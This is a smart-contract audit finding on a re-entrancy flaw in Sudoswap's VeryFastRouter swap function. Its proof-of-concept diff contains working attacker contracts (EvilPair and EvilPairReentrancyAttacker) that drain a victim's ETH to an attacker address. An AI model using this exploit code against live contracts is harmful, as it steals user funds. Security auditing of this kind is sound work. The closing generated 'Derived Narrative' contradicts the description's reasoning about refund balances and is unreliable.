---
id: 18724
severity: "High"
---

# Malicious pair can re-enter `VeryFastRouter` to drain original caller's funds

## Description

```solidity
[`VeryFastRouter::swap`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L266) is the main entry point for a user to perform a batch of sell and buy orders on the new Sudoswap router, allowing partial fill conditions to be specified. Sell orders are executed first, followed by buy orders. The `LSSVMPair` contracts themselves are implemented in such a way that re-entrancy is not possible, but the same is not true of the `VeryFastRouter`. Assuming a user calls `VeryFastRouter::swap`, selling some NFTs and passing in some additional ETH value for subsequent buy orders, an attacker can re-enter this function under certain conditions to steal the original caller's funds. Given that this function does not check whether the user input contains valid pairs, an attacker can use this to manipulate the return values of `LSSVMPair::swapNFTsForToken` and `LSSVMPair::swapTokenForSpecificNFTs`, which interferes with internal accounting. In this way, the attacker can make it appear that a buy/sell order input/output more/less value than expected.

Consider the case where the attacker is a malicious royalty recipient, and their re-entrant swap order contains a single sell order and an empty array of buy orders. Calling out to their malicious pair gives control over the [`outputAmount`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L296) value which is used in addition assignment to the [virtual balance](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L301-L302) `ethAmount` used to [transfer any remaining ETH](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L482-L486) after all orders have been executed, filled partially or otherwise. The current contract balance is the original caller's remaining ETH value, so the attacker would intend to have their malicious pair return this amount to drain the funds. However, without the introduction of a malicious pair contract to both the attacker's re-entrant order and the original caller's order, the attacker is prevented from stealing the remaining intermediate funds due to the safe ETH transfer of `ethAmount` as this will cause the original caller's transaction to revert at this same line - the contract is attempting to transfer balance that it no longer has. If this had instead been a transfer of the contract balance directly rather than a virtual balance, then the attacker could succeed in stealing the user's funds without baiting them into making a call to their malicious pair. Of course, calling a malicious pair allows it to steal any funds sent with the call, but given that this can manipulate internal accounting through an incorrect return value, as described above, calling this pair can impact other swap orders/partial fills, tricking the contract into thinking it has fewer funds than it does during the lifetime of the original caller's transaction such that the attacker can re-enter and make away with their ETH. Otherwise, the extent of this vulnerability is a DoS attack on calls to the router.

The steps to perform this exploit are as follows:

* Trick the caller into including an order on the attacker's malicious pair.
* The attacker re-enters, passing an order of sell orders and calling back to their malicious pair contract due to unvalidated user input. This inflates the `outputAmount`, which in turn inflates the `ethAmount` for their call.
* Excess ETH is sent to the attacker.
* The malicious pair manipulates `ethAmount` by returning a large `inputAmount`.
* Original caller has any additional partial buy orders fail to fill and receives no ETH in return for selling their NFTs.

The second exploit case is where the caller specifies the router contract as their token recipient, performing DIY recycle ETH functionality of sorts for subsequent buy orders, likely with zero input `msg.value`. This would allow an attacker to steal intermediate balances by re-entering the final sell order before any funds are consumed by buy orders, as these funds are not tracked by `ethAmount`, and so the final transfer will not revert. Independent of a malicious royalty recipient, this also means that any excess ETH sent not consumed by subsequent buy orders will remain locked in the contract if the caller specifies the router contract as their token recipient. Pool funds are safe due to the use of the factory re-entrancy guard, which prohibits calling into any of the pair swap functions that are responsible for transfers to the router. ETH value sent with ERC-20-based swaps due to user misconfiguration is also vulnerable in the case of malicious royalty recipient.
```
This vulnerability results in the loss of user funds, with high impact and medium likelihood, so we evaluate the severity to HIGH.

## Proof of Concept

```diff
diff --git a/src/VeryFastRouter.sol b/src/VeryFastRouter.sol
index 16047b9..2bd3797 100644
--- a/src/VeryFastRouter.sol
+++ b/src/VeryFastRouter.sol
@@ -85,6 +85,7 @@ contract VeryFastRouter {
     error VeryFastRouter__InvalidPair();
     error VeryFastRouter__BondingCurveQuoteError();

+   event vfr_log_named_uint         (string key, uint val);
     constructor(ILSSVMPairFactoryLike _factory) {
         factory = _factory;
     }
@@ -403,12 +404,12 @@ contract VeryFastRouter {

                 // Deduct ETH amount if it's an ETH swap
                 if (order.ethAmount != 0) {
-                    console.log("deducting eth amount");
-                    console.log("before: %s", ethAmount);
+                    // console.log("deducting eth amount");
+                    // console.log("before: %s", ethAmount);
                     ethAmount -= inputAmount;
-                    console.log("after: %s", ethAmount);
-                    console.log("router balance: %s", address(this).balance);
-                    console.log("sender balance: %s", msg.sender.balance);
+                    // console.log("after: %s", ethAmount);
+                    // console.log("router balance: %s", address(this).balance);
+                    // console.log("sender balance: %s", msg.sender.balance);
                 }
             }
             // Otherwise, we need to do some partial fill calculations first
@@ -488,10 +489,15 @@ contract VeryFastRouter {
         }

         // Send excess ETH back to token recipient
-        console.log("ethAmount: %s", ethAmount);
+        emit vfr_log_named_uint("eth Amount", ethAmount);
+        emit vfr_log_named_uint("pair balance before", address(this).balance);
+        if(address(this).balance > ethAmount){
+            emit vfr_log_named_uint("pair balance after", address(this).balance - ethAmount);
+        }
+        else{
+            emit vfr_log_named_uint("pair balance after", 0);
+        }
         if (ethAmount != 0) {
-            console.log("balance: %s", address(this).balance);
-            console.log("transfering %s ETH to: %s", ethAmount, swapOrder.tokenRecipient);
             payable(swapOrder.tokenRecipient).safeTransferETH(ethAmount); // @audit-ok - doesn't seem to be a case when this is less than the actual amount to refund
         }
     }
diff --git a/src/test/base/VeryFastRouterAllSwapTypes.sol b/src/test/base/VeryFastRouterAllSwapTypes.sol
index 9909271..6294bd2 100644
--- a/src/test/base/VeryFastRouterAllSwapTypes.sol
+++ b/src/test/base/VeryFastRouterAllSwapTypes.sol
@@ -33,6 +33,9 @@ import {RoyaltyEngine} from "../../RoyaltyEngine.sol";
 import {VeryFastRouter} from "../../VeryFastRouter.sol";
 import {LSSVMPairFactory} from "../../LSSVMPairFactory.sol";

+import {EvilPair} from "../mixins/EvilPair.sol";
+import {EvilPairReentrancyAttacker} from "../mixins/EvilPairReentrancyAttacker.sol";
+
 abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holder, ConfigurableWithRoyalties {
     ICurve bondingCurve;
     RoyaltyEngine royaltyEngine;
@@ -43,6 +46,8 @@ abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holde
     address constant ROUTER_CALLER = address(1);
     address constant TOKEN_RECIPIENT = address(420);
     address constant NFT_RECIPIENT = address(0x69);
+    address constant PWNER = payable(address(999));
+    address constant ALICE = payable(address(666));

     uint256 constant START_INDEX = 0;
     uint256 constant NUM_BEFORE_PARTIAL_FILL = 2;
@@ -1286,4 +1291,87 @@ abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holde
         }
         vm.stopPrank();
     }
+
+    function testSwapEvilPairReentrancyAttack_audit() public {
+        EvilPair evilPair;
+        EvilPairReentrancyAttacker evilPairReentrancyAttacker;
+        uint256 totalEthToSend = 100 ether;
+        deal(ALICE, totalEthToSend);
+
+        //0. create a pair with a bonding curve
+        uint256[] memory nftIds;
+        LSSVMPair pair;
+        nftIds = _getArray(START_INDEX, END_INDEX);
+
+        // mints END_INDEX - START_INDEX + 1 NFTs
+        pair = setUpPairERC721ForSale(0, address(0), nftIds);
+
+        (uint256 delta, uint256 spotPrice) = getReasonableDeltaAndSpotPrice();
+
+
+        //1. create a honeypotNft that again mints END_INDEX - START_INDEX + 1 nfts
+        IERC721Mintable honeypotNft = _setUpERC721(address(this), address(this), ALICE);
+
+        //2. setup a evilPair & transfer above NFTs to the evilPair
+        evilPair = new EvilPair(spotPrice, delta, address(pair.bondingCurve()), payable(address(0)), address(honeypotNft));
+        for (uint256 j; j< nftIds.length; j++){
+            IERC721(honeypotNft).transferFrom(address(this), address(evilPair), nftIds[j]);
+        }
+
+        // 3. setup evil pair attacker
+        evilPairReentrancyAttacker = new EvilPairReentrancyAttacker(router, spotPrice, PWNER, address(evilPair));
+
+        //4. set the evil pair attacker address as above
+        evilPair.setAttacker(payable(evilPairReentrancyAttacker));
+        evilPair.setReentrancyAttack(true); // just a flag to change the logic of setReentrancyAttack and swapNFTsForToken
+        evilPair.setRouterAddress(payable(router));
+        uint256[] memory partialFillAmounts = new uint256[](0);
+
+        //5. create a buy order so that we can re-enter from swapTokenForSpecificNFTs
+        VeryFastRouter.BuyOrderWithPartialFill memory attackBuyOrder = VeryFastRouter.BuyOrderWithPartialFill({
+            pair: LSSVMPair(address(evilPair)),
+            maxInputAmount: totalEthToSend,
+            ethAmount:totalEthToSend,
+            nftIds: nftIds,
+            expectedSpotPrice: pair.spotPrice(),
+            isERC721: true,
+            maxCostPerNumNFTs: partialFillAmounts
+        });
+
+       VeryFastRouter.BuyOrderWithPartialFill[] memory buyOrders =
+            new VeryFastRouter.BuyOrderWithPartialFill[](1);
+        buyOrders[0] = attackBuyOrder;
+
+        //6. Create a dummy sell order - 0 array
+        VeryFastRouter.SellOrderWithPartialFill[] memory sellOrders =
+            new VeryFastRouter.SellOrderWithPartialFill[](0);
+
+        //7. Create a swap order
+         VeryFastRouter.Order memory swapOrder = VeryFastRouter.Order({
+            buyOrders: buyOrders,
+            sellOrders: sellOrders,
+            tokenRecipient: payable(TOKEN_RECIPIENT),
+            nftRecipient: NFT_RECIPIENT,
+            recycleETH: true
+        });
+
+        //8. We calculate the price of purchasing ALL NFTs from evil pair for given bonding curve
+        // ignore royalties for this calculation
+        // initial balance of ALICE (100 ether) - input Amount should be the final balance in ALICE account after swap
+        // by re-entering and placing a fake buy txn, we can drain all of ALICE's eth
+        (, , , uint256 inputAmount, ,) = ICurve(pair.bondingCurve()).getBuyInfo(uint128(spotPrice), uint128(delta), nftIds.length, 0, 0);
+
+        emit log_named_uint("input amount to purchase all NFTs ", inputAmount);
+        emit log_named_uint("Balance in Alice Account Before ", ALICE.balance);
+        emit log_named_uint("Balance in Pwner Account Before ", PWNER.balance);
+        emit log_named_uint("Balance in Router Account Before ", address(router).balance);
+
+        // 8. Perform the swap
+        vm.prank(ALICE);
+        router.swap{value: totalEthToSend}(swapOrder);
+
+        emit log_named_uint("Balance in Alice Account After ", ALICE.balance);
+        emit log_named_uint("Balance in Pwner Account After ", PWNER.balance);
+        emit log_named_uint("Balance in Router Account After ", address(router).balance);
+    }
 }
diff --git a/src/test/mixins/EvilPair.sol b/src/test/mixins/EvilPair.sol
new file mode 100644
index 0000000..8a8ad6d
--- /dev/null
+++ b/src/test/mixins/EvilPair.sol
@@ -0,0 +1,119 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity ^0.8.0;
+
+import {console} from "forge-std/Test.sol";
+import {EvilPairReentrancyAttacker} from "./EvilPairReentrancyAttacker.sol";
+import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+import {ICurve} from "../../bonding-curves/ICurve.sol";
+
+contract EvilPair {
+    uint256 expectedSpotPrice;
+    uint256 expectedDelta;
+    address public bondingCurve;
+    address payable attacker;
+    uint256 counter;
+    uint256 inputAmount;
+    address nftAddress;
+    address payable routerAddress;
+    bool isReentrancyAttack;
+
+   event evilpair_log_named_uint         (string key, uint val);
+   event evilpair_log_named_address      (string key, address val);
+
+    constructor(uint256 _expectedSpotPrice, uint256 _delta, address _bondingCurve, address payable _attacker, address _nft) {
+        expectedSpotPrice = _expectedSpotPrice;
+        expectedDelta = _delta;
+        bondingCurve = _bondingCurve;
+        attacker = _attacker;
+        nftAddress = _nft;
+    }
+
+    function setAttacker(address payable _attacker) public {
+        attacker = _attacker;
+    }
+
+    function setReentrancyAttack(bool _isAttack) public{
+        isReentrancyAttack = _isAttack;
+    }
+
+    function setRouterAddress(address payable _router) public{
+        routerAddress = _router;
+    }
+
+    function swapNFTsForToken(
+        uint256[] calldata nftIds,
+        uint256 minExpectedTokenOutput,
+        address payable tokenRecipient,
+        bool isRouter,
+        address routerCaller
+    ) external virtual returns (uint256) {
+        if(isReentrancyAttack){
+            //calculate price of original purchase of user
+            //reserve that amount of eth for original buy txn to go through
+            // and drain the balance funds
+
+            // reserveAmount of eth calculation
+            uint256 numNfts = IERC721(nftAddress).balanceOf(address(this));
+            (, , , uint256 inputAmount, ,) = ICurve(bondingCurve).getBuyInfo(uint128(expectedSpotPrice), uint128(expectedDelta), numNfts, 0, 0);
+            emit evilpair_log_named_uint("input amount inside swapNFTForToken ", inputAmount);
+            emit evilpair_log_named_uint("balance eth in evilPair currently ", address(this).balance);
+
+
+            // we ignore royalties for this
+            if(address(this).balance > inputAmount){
+                uint256 splitPayment = (address(this).balance - inputAmount)*50/100;
+                //transfer 50% to the router to enable a payoff
+                (bool success, ) = address(routerAddress).call{value: splitPayment}("");
+                return splitPayment;
+            }
+            return 0;
+        }
+
+    }
+
+    function swapTokenForSpecificNFTs(
+        uint256[] calldata nftIds,
+        uint256 maxExpectedTokenInput,
+        address nftRecipient,
+        bool isRouter,
+        address routerCaller
+    ) external payable virtual returns (uint256) {
+        uint256 ethAmount = msg.value;
+        if(isReentrancyAttack){
+            EvilPairReentrancyAttacker(attacker).attack();
+
+        }
+        else{
+            sweepETH();
+        }
+
+        return ethAmount;
+    }
+
+    function sweepETH() public {
+        (bool success, ) = attacker.call{value: address(this).balance}("");
+        require(success, "eth sweep success");
+    }
+
+    function spotPrice() external view virtual returns (uint256) {
+        return expectedSpotPrice;
+    }
+
+    function delta() external view virtual returns (uint256) {
+        return expectedDelta;
+    }
+
+    function fee() external view virtual returns (uint256) {
+        return 0;
+    }
+
+    function nft() external view virtual returns (address) {
+        return nftAddress;
+    }
+
+    function calculateRoyaltiesView(uint256 assetId, uint256 saleAmount)
+        public
+        view
+        returns (address payable[] memory royaltyRecipients, uint256[] memory royaltyAmounts, uint256 royaltyTotal)
+    {}
+}
\ No newline at end of file
diff --git a/src/test/mixins/EvilPairReentrancyAttacker.sol b/src/test/mixins/EvilPairReentrancyAttacker.sol
new file mode 100644
index 0000000..019019f
--- /dev/null
+++ b/src/test/mixins/EvilPairReentrancyAttacker.sol
@@ -0,0 +1,79 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity ^0.8.0;
+
+import {LSSVMPair} from "../../LSSVMPair.sol";
+import {VeryFastRouter} from "../../VeryFastRouter.sol";
+
+import {console} from "forge-std/Test.sol";
+
+contract EvilPairReentrancyAttacker {
+    VeryFastRouter immutable internal router;
+    uint256 immutable internal expectedSpotPrice;
+    address immutable internal PWNER;
+    address immutable internal evilPair;
+    uint256 counter;
+
+    constructor(VeryFastRouter _router, uint256 _expectedSpotPrice, address _pwner, address _evilPair) {
+        router = _router;
+        expectedSpotPrice = _expectedSpotPrice;
+        PWNER = _pwner;
+        evilPair = _evilPair;
+    }
+
+    fallback() external payable {
+        // console.log("entered fallback");
+        // if (msg.sig == this.attack.selector) {
+        //     console.log("doing attack");
+        //     attack();
+        //     return;
+        // }
+        // if (++counter == 2) {
+        //     console.log("doing attack");
+        //     attack();
+        // } else {
+        //     console.log("doing nothing");
+        //     return;
+        // }
+    }
+
+    receive() external payable {}
+
+    function attack() public {
+        console.log("executing attack");
+        VeryFastRouter.BuyOrderWithPartialFill[] memory attackBuyOrders = new VeryFastRouter.BuyOrderWithPartialFill[](0);
+        VeryFastRouter.SellOrderWithPartialFill[] memory attackSellOrders = new VeryFastRouter.SellOrderWithPartialFill[](1);
+        uint256[] memory nftInfo = new uint256[](1);
+        nftInfo[0] = 1337;
+        uint256[] memory empty = new uint256[](0);
+
+        attackSellOrders[0] = VeryFastRouter.SellOrderWithPartialFill({
+            pair: LSSVMPair(evilPair),
+            isETHSell: true,
+            isERC721: true,
+            nftIds: nftInfo,
+            doPropertyCheck: false,
+            propertyCheckParams: "",
+            expectedSpotPrice: expectedSpotPrice < type(uint128).max ? uint128(expectedSpotPrice) : type(uint128).max,
+            minExpectedOutput: 0,
+            minExpectedOutputPerNumNFTs: empty
+        });
+
+        VeryFastRouter.Order memory attackSwapOrder = VeryFastRouter.Order({
+            buyOrders: attackBuyOrders,
+            sellOrders: attackSellOrders,
+            tokenRecipient: payable(PWNER),
+            nftRecipient: PWNER,
+            recycleETH: true
+        });
+
+
+        router.swap(attackSwapOrder);
+
+        console.log("completed attack");
+    }
+
+    function sweepETH() public {
+        (bool success, ) = PWNER.call{value: address(this).balance}("");
+        require(success, "sweep eth failed");
+    }
+}
\ No newline at end of file
```

## Recommendation

```solidity
Validate user inputs to `VeryFastRouter::swap`, in particular pairs, and consider making this function non-reentrant.
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the VeryFastRouter.swap function, which processes a batch of sell and buy orders without validating the pair addresses supplied by the caller and without protecting the function against re‑entrancy. An attacker can introduce a malicious LSSVMPair (or a malicious royalty recipient) into the order list. When the router calls the pair’s swapNFTsForToken or swapTokenForSpecificNFTs, the malicious contract can return a manipulated outputAmount that inflates the router’s internal virtual ethAmount variable. Because the router later uses this virtual balance to determine how much ETH to send back to the tokenRecipient, the attacker can cause the router to believe it still holds the caller’s ETH and then re‑enter the swap to transfer that ETH to themselves. The re‑entrancy occurs after the first sell order has been processed but before the router finalizes the ETH refund, allowing the malicious pair to call back into VeryFastRouter.swap and alter internal accounting. As a result, the original user may receive no ETH for their sold NFTs, partial buy orders fail, and the attacker walks away with the caller’s ETH. The issue also manifests when the caller sets the router contract itself as the tokenRecipient and enables ETH recycling; in this configuration the router’s refund logic does not track the intermediate ETH correctly, permitting the attacker to drain the intermediate balance. The bug was discovered during a security audit by constructing an EvilPair contract that implements swapNFTsForToken and swapTokenForSpecificNFTs with a flag that triggers a re‑entrancy attack, and confirming that the router’s ethAmount variable can be inflated. The problem is subtle because the router appears to use safe ETH transfer and the pair contracts themselves are non‑re‑entrant; however the router’s reliance on a virtual balance and lack of input validation creates an indirect re‑entrancy vector that is not obvious from the code. This vulnerability belongs to the class of unvalidated external call leading to re‑entrancy and accounting manipulation, violating the assumption that the router’s internal ETH accounting matches the actual contract balance. The recommended mitigation is to validate that each pair in the swap order is a legitimate pair created by the factory, to add a re‑entrancy guard on the swap function, and to compute the refund amount directly from the contract’s real balance rather than from a mutable virtual variable. These changes would prevent a malicious pair from inflating the outputAmount and ensure that any ETH sent with the transaction is either correctly transferred to the intended recipient or safely reverted.
